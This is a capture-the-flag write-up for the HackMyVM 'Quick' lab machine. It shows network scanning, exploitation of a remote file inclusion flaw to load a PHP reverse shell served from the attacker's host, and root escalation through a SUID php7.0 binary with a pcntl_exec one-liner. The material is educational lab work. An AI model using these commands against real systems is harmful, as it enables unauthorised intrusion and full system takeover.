---
title: Write-up Quick on HackMyVM
author: eMVee
date: 2024-01-31 00:00:00 +0000
categories: [CTF, HackMyVM]
tags: [HackMyVM, OSCP, RFI, SUID]
render_with_liquid: false
---

A while back I was building a vulnerable web application in PHP. Initially I planned to create another vulnerability. But I changed my mind and started building the Quick Automative website. After this I started to install and configure the server. In this writeup I describe how to hack the Quick machine on HackMyVM.


## Getting started

Before starting we should change our working directory to the project directory.
```bash
┌──(emvee㉿kali)-[~]
└─$ cd Documents/HMV/Quick     
```
Next we should check our own IP address.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Quick]
└─$ ip a        
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:0e:ca:e6 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
       valid_lft 338sec preferred_lft 338sec
    inet6 fe80::a00:27ff:fe0e:cae6/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:43:c4:e6:fd brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever

```
Since we know our own IP address we should identify the IP address of our target on our virtual network, we can do this with fping.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Quick]
└─$ fping -ag 10.0.2.0/24 2> /dev/null
10.0.2.1
10.0.2.2
10.0.2.3
10.0.2.15
10.0.2.29

```
Now we know the IP address of our target we can assign it to a variable so we can use this in the commands instead of the full IP address.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Quick]
└─$ ip=10.0.2.29
```

----
## Enumeration

Let's run a ping request to see if it will answer our ping request.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Quick]
└─$ ping -c 3 $ip
PING 10.0.2.29 (10.0.2.29) 56(84) bytes of data.
64 bytes from 10.0.2.29: icmp_seq=1 ttl=64 time=1.01 ms
64 bytes from 10.0.2.29: icmp_seq=2 ttl=64 time=1.13 ms
64 bytes from 10.0.2.29: icmp_seq=3 ttl=64 time=1.26 ms

--- 10.0.2.29 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2030ms
rtt min/avg/max/mdev = 1.013/1.133/1.261/0.101 ms
```
In the response we can see the value 64 in the `ttl` field. This is a good indicator that our target is running on a Linus Operating System.

One of the first steps we should do is identify open ports and services on the target. This can be done with nmap.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Quick]
└─$ sudo nmap -sC -sV -T4 -A -O -p- $ip
[sudo] password for emvee: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-16 20:11 CET
Nmap scan report for 10.0.2.29
Host is up (0.00086s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Quick Automative
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 08:00:27:41:D3:56 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.86 ms 10.0.2.29

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.77 seconds

```
It looks like there is one port open on this machine. Let's add some information to our notes.
- Linux, probably Ubuntu
- Port 80
	- HTTP
	- Apache 2.4.41
	- Title: Quick Automative


Since there is only a web service running on this machine we should enumerate this service. We can use whatweb to identify some technologies used on this machine.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Quick]
└─$ whatweb http://$ip                                                                                                          
http://10.0.2.29 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.0.2.29], Script[text/javascript], Title[Quick Automative]

```
Unfortunately, no more information was found with whatweb. Let's visit the website in the browser.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Quick]
└─$ firefox $ip &                     
[1] 208478

```
![image](/assets/img/WriteUp/HackMyVM/Quick/Pasted image 20231216201916.png){: width="700" height="400" }

The website shows a car shop,  maintenance and repairs and something about customizing cars. Let's first check the website fully before trying anything.
![image](/assets/img/WriteUp/HackMyVM/Quick/Pasted image 20231216202005.png){: width="700" height="400" }

While navigating through the website the URL changed and the argument in the URL indicated that this website might be vulnerable for Local File Inclusion (LFI) or Remote File Inclusion(RFI). If RFI is present we can own the system via our own webserver.

Let's run nikto to check for known vulnerabilities.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Quick]
└─$ nikto -h $ip      
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.0.2.29
+ Target Hostname:    10.0.2.29
+ Target Port:        80
+ Start Time:         2023-12-16 20:13:34 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /images: IP address found in the 'location' header. The IP is "127.0.1.1". See: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed
+ /images: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is "127.0.1.1". See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649
+ Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /images/: Directory indexing found.
+ /index.php: Output from the phpinfo() function was found.
+ /index.php?page=http://blog.cirt.net/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2
+ 8102 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2023-12-16 20:14:10 (GMT1) (36 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```
Nikto did discover some interesting information and it detected the RFI vulnerability as well.
Let's copy the PHP webshell to our working directory and open it with Visual Code.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Quick]
└─$ cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php

┌──(emvee㉿kali)-[~/Documents/HMV/Quick]
└─$ code shell.php                                               
┏━(Message from Kali developers)
┃ code is not the binary you may be expecting.
┃ You are looking for \"code-oss\"
┃ Starting code-oss for you...
┗━

```

Next we should change the IP address to our attackers IP address.
![image](/assets/img/WriteUp/HackMyVM/Quick/Pasted image 20231216202547.png){: width="700" height="400" }


As soon as the file is saved we should start our own HTTP server with pyhton.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Quick]
└─$ ll
total 8
-rwxr-xr-x 1 emvee emvee 5491 Dec 16 20:24 shell.php

┌──(emvee㉿kali)-[~/Documents/HMV/Quick]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

In a new terminal we should start the netcat listener on port 1234.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Quick]
└─$ rlwrap nc -lvnp 1234
listening on [any] 1234 ...

```

## Initial access
Next we should change the URL to our own HTTP server and only specify the name of the file without extension since it is completed by the PHO website on the victim server.
![image](/assets/img/WriteUp/HackMyVM/Quick/Pasted image 20231216203105.png){: width="700" height="400" }

As soon as we hit enter the reverse (web)shell should have connected to our netcat listener.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/Quick]
└─$ rlwrap nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.29] 55424
Linux quick 5.4.0-169-generic #187-Ubuntu SMP Thu Nov 23 14:52:28 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 19:30:43 up 22 min,  0 users,  load average: 0.00, 0.00, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
The connection was established. Let's find out who we are, what membership we have and on what machine we are working.
```
$ whoami;id;hostname;ip a; pwd
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
quick
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:41:d3:56 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.29/24 brd 10.0.2.255 scope global dynamic enp0s3
       valid_lft 441sec preferred_lft 441sec
    inet6 fe80::a00:27ff:fe41:d356/64 scope link 
       valid_lft forever preferred_lft forever
/
$ 

```
Since we are www-data and working we have to gain more privileges to own the system.
First we should upgrade our shell a bit.
```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@quick:/$ 
```
Now let's enumerate the home directories of the users and see if we can anything useful from those.
```bash
www-data@quick:/$ ls -ahlR /home
ls -ahlR /home
/home:
total 12K
drwxr-xr-x  3 root   root   4.0K Dec 16 14:38 .
drwxr-xr-x 20 root   root   4.0K Dec 16 14:28 ..
drwxr-xr-x  7 andrew andrew 4.0K Dec 16 18:36 andrew

/home/andrew:
total 48K
drwxr-xr-x 7 andrew andrew 4.0K Dec 16 18:36 .
drwxr-xr-x 3 root   root   4.0K Dec 16 14:38 ..
-rw------- 1 andrew andrew   75 Dec 16 18:50 .bash_history
-rw-r--r-- 1 andrew andrew  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 andrew andrew 3.7K Feb 25  2020 .bashrc
drwx------ 2 andrew andrew 4.0K Dec 16 14:39 .cache
drwx------ 3 andrew andrew 4.0K Dec 16 18:34 .gnupg
drwxrwxr-x 3 andrew andrew 4.0K Dec 16 18:21 .local
-rw-r--r-- 1 andrew andrew  807 Feb 25  2020 .profile
drwx------ 2 andrew andrew 4.0K Dec 16 14:39 .ssh
-rw-r--r-- 1 andrew andrew    0 Dec 16 14:39 .sudo_as_admin_successful
drwx------ 3 andrew andrew 4.0K Dec 16 18:26 snap
-rw-rw-r-- 1 andrew andrew 1.1K Dec 16 18:21 user.txt
ls: cannot open directory '/home/andrew/.cache': Permission denied
ls: cannot open directory '/home/andrew/.gnupg': Permission denied

/home/andrew/.local:
total 12K
drwxrwxr-x 3 andrew andrew 4.0K Dec 16 18:21 .
drwxr-xr-x 7 andrew andrew 4.0K Dec 16 18:36 ..
drwx------ 3 andrew andrew 4.0K Dec 16 18:21 share
ls: cannot open directory '/home/andrew/.local/share': Permission denied
ls: cannot open directory '/home/andrew/.ssh': Permission denied
ls: cannot open directory '/home/andrew/snap': Permission denied
```
We can read the user flag since it has the permissions to be read by everyone. So let's capture it!
```bash
www-data@quick:/$ cat /home/andrew/user.txt
cat /home/andrew/user.txt


                                 _________
                          _.--""'-----,   `"--.._
                       .-''   _/_      ; .'"----,`-,
                     .'      :___:     ; :      ;;`.`.
                    .      _.- _.-    .' :      ::  `..
                 __;..----------------' :: ___  ::   ;;
            .--"". '           ___.....`:=(___)-' :--'`.
          .'   .'         .--''__       :       ==:    ;
      .--/    /        .'.''     ``-,   :         :   '`-.
   ."', :    /       .'-`\\       .--.\ :         :  ,   _\
  ;   ; |   ;       /:'  ;;      /__  \\:         :  :  /_\\
  |\_/  |   |      / \__//      /"--\\ \:         :  : ;|`\|    
  : "  /\__/\____//   """      /     \\ :         :  : :|'||
["""""""""--------........._  /      || ;      __.:--' :|//|
 "------....______         ].'|      // |--"""'__...-'`\ \//
   `|HMV{FLAG-FLAG} |.--'": :  \    //  |---"""      \__\_/
     """""""""'            \ \  \_.//  /
       `---'                \ \_     _'
                             `--`---'  
                             

                             



www-data@quick:/$ 

```

One of the things we always have to check on a target is to see if there are some unknown SUID files on the system. We should search for SUID files and if they are not known to the system we might be able to exploit them.
```bash
www-data@quick:/$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/snap/core20/1828/usr/bin/chfn
/snap/core20/1828/usr/bin/chsh
/snap/core20/1828/usr/bin/gpasswd
/snap/core20/1828/usr/bin/mount
/snap/core20/1828/usr/bin/newgrp
/snap/core20/1828/usr/bin/passwd
/snap/core20/1828/usr/bin/su
/snap/core20/1828/usr/bin/sudo
/snap/core20/1828/usr/bin/umount
/snap/core20/1828/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1828/usr/lib/openssh/ssh-keysign
/snap/snapd/18357/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/bin/at
/usr/bin/sudo
/usr/bin/umount
/usr/bin/mount
/usr/bin/chsh
/usr/bin/su
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/php7.0
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/fusermount
www-data@quick:/$ 

```
We can see that `/usr/bin/php7.0` is a SUID file. We can check  [GTFObins](https://gtfobins.github.io/gtfobins/php/#suid) to see how we can exploit it.

## Privilege escalation
Since it is well explained how we can exploit this misconfiguration we can simply apply it to our target.
```bash
www-data@quick:/$ CMD="/bin/sh"
CMD="/bin/sh"
www-data@quick:/$ /usr/bin/php7.0 -r "pcntl_exec('/bin/sh', ['-p']);"
/usr/bin/php7.0 -r "pcntl_exec('/bin/sh', ['-p']);"
# 
```
We got an interactive shell, so we can check who we are, what membership we have and where we are working.
```bash
# whoami;id;hostname;pwd;ip a
whoami;id;hostname;pwd;ip a
root
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
quick
/
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:41:d3:56 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.29/24 brd 10.0.2.255 scope global dynamic enp0s3
       valid_lft 320sec preferred_lft 320sec
    inet6 fe80::a00:27ff:fe41:d356/64 scope link 
       valid_lft forever preferred_lft forever
```
We are root!  Now we can capture the root flag.
```bash
# ls /root
ls /root
root.txt  snap
# cat /root/root.txt
cat /root/root.txt


            ___.............___
         ,dMMMMMMMMMMMMMMMMMMMMMb.
        dMMMMMMMMMMMMMMMMMMMMMMMMMb
        |        | -_  - |        |
        |        |_______|___     |
        |     ___......./'.__`\   |
        |_.-~"               `"~-.|
        7\         _...._        |`.
       /  l     .-'      `-.     j  \
      :   .qp. / __________ \ .qp.   :
      |  d8888b |          | d8888b  |
  .---:  `Y88P|_|__________|_|Y88P'\/`"-.
 /     : /,------------------------.:    \
:      |`.    | | [_FLAG_] ||     ,'|     :
`\.____|  `.  : `.________.'|   ,'  |____.'
  MMMMM|   |  |`-.________.-|  /    |MMMMM 
 .-------------`------------'-'-----|-----.
(___HMV{FLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAG}__)
  MMMMMM                            MMMMMM 
  `MMMM'                            `MMMM'



```
